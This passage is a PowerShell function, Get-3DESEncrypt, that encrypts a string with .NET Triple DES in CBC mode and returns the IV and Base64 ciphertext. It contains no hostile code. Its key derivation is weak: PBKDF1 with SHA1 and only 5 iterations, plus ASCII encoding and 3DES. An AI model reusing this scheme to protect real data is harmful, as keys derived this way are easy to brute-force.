The salt used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA1, 5 rounds)

.EXAMPLE

Get-3DESEncrypt -Message "Hello World" -Password "P@ssw0rd" -Salt "NotAGoodPassword"

Description
-----------

Encrypts the message "Hello World" and returns the result as a custom psobject with the properties "IV" and "Ciphertext".

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Message,

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Salt
    )

#Create a new instance of the .NET 3DES provider
$3DES = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::Create()
$3DES.Mode =  [System.Security.Cryptography.CipherMode]::CBC

#Derive an encryption key from the password and the salt
$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA1",5)

#The 3DES instance automatically creates an IV. This is stored in a separate variable for later use.
$IV = $3DES.IV

#Set the parameters for 3DES encryption
$3DES.Padding = "PKCS7"
$3DES.KeySize = 128
$3DES.Key = $Key.GetBytes(16)

#Create a new encryptor
$3DESCryptor = $3DES.CreateEncryptor()

#Create a memory and crypto stream for encryption
$MemoryStream = New-Object System.IO.MemoryStream
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$3DESCryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)

#Conver the message to a byte array
$MessageBytes = [System.Text.Encoding]::ASCII.GetBytes($Message)

#Encrypt the message using cryptostream
$CryptoStream.Write($MessageBytes,0,$MessageBytes.Length)
$CryptoStream.FlushFinalBlock()

#Get the ciphertext as byte array
$CipherText = $MemoryStream.ToArray()

#Free ressources
$CryptoStream.Close()
$MemoryStream.Close()
$3DES.Clear()

#Create a custom psobject containing the initialization vector and the ciphertext
$CryptoResult = New-Object -TypeName PSObject
$CryptoResult | Add-Member -MemberType NoteProperty -Name "IV" -Value ([Convert]::ToBase64String($IV))
$CryptoResult | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value ([Convert]::ToBase64String($CipherText))

return($CryptoResult)

}
